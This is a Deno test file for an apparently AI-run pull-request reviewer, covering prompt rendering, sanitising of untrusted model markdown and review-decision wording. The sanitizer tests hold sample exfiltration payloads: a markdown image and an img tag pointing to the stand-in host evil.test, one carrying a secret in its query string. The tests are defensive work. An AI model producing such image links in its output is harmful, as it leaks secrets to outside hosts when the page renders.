import { deepEqual as assertEquals, throws as assertThrows } from "node:assert/strict";
import { renderPrompt } from "./prompt.ts";
import { reviewBody } from "./messages.ts";
import { sanitizeMarkdown } from "./sanitize.ts";

const variables = {
  repository: "marimo-team/marimo",
  number: 7,
  headSha: "a".repeat(40),
  headDir: "pr-head",
  contextDir: "_agent_review/context",
};

const noInstructions = { reviewGuide: undefined, projectFiles: [] };

Deno.test("renders prompt variables and appends repository instructions", () => {
  const prompt = renderPrompt(["Review #{{number}}.", "Read {{headDir}}/."], variables, {
    reviewGuide: "# Review instructions\n\nCheck the kernel.",
    projectFiles: ["AGENTS.md", "marimo/_server/AGENTS.md"],
  });
  assertEquals(prompt.startsWith("Review #7.\n\nRead pr-head/."), true);
  assertEquals(prompt.includes("- `marimo/_server/AGENTS.md`"), true);
  assertEquals(prompt.indexOf("AGENTS.md") < prompt.indexOf("Check the kernel."), true);
  assertEquals(prompt.trimEnd().endsWith("`REVIEW.md`:\n\nCheck the kernel."), true);
  assertEquals(renderPrompt(["x"], variables, { ...noInstructions, reviewGuide: "  \n" }), "x\n");
  assertThrows(() => renderPrompt(["{{missing}}"], variables, noInstructions));
});

Deno.test("sanitizes untrusted model markdown", () => {
  assertEquals(
    sanitizeMarkdown("see ![x](https://evil.test/?d=secret)"),
    "see [x](https://evil.test/?d=secret)",
  );
  assertEquals(sanitizeMarkdown('a<img src="https://evil.test">b'), "ab");
  assertEquals(sanitizeMarkdown("cc @octocat"), "cc @\u200boctocat");
  assertEquals(sanitizeMarkdown("`List<String>` and a && b"), "`List<String>` and a && b");
});

Deno.test("review body distinguishes proposed from enforced decisions", () => {
  const result = {
    outcome: "completed" as const,
    summary: "s",
    coverage: "c",
    limitations: [],
    findings: [],
  };
  const run = {
    harness: "claude" as const,
    requester: "maintainer",
    runUrl: "https://x",
    headSha: "a".repeat(40),
  };
  const options = { run, result, unanchored: [], notes: [] };
  const verdict = { kind: "comment" as const, reasons: ["Changes `![x](https://evil.test)`."] };

  const advisory = reviewBody({ ...options, verdict, event: "COMMENT", authority: "advisory" });
  assertEquals(advisory.includes("**Decision: Comment**"), true);
  assertEquals(advisory.includes("https://evil.test") && !advisory.includes("!["), true);

  const proposed = reviewBody({
    ...options,
    verdict: { kind: "approve" },
    event: "COMMENT",
    authority: "advisory",
  });
  assertEquals(proposed.includes("**Proposed decision: Approve** (not enforced"), true);
});
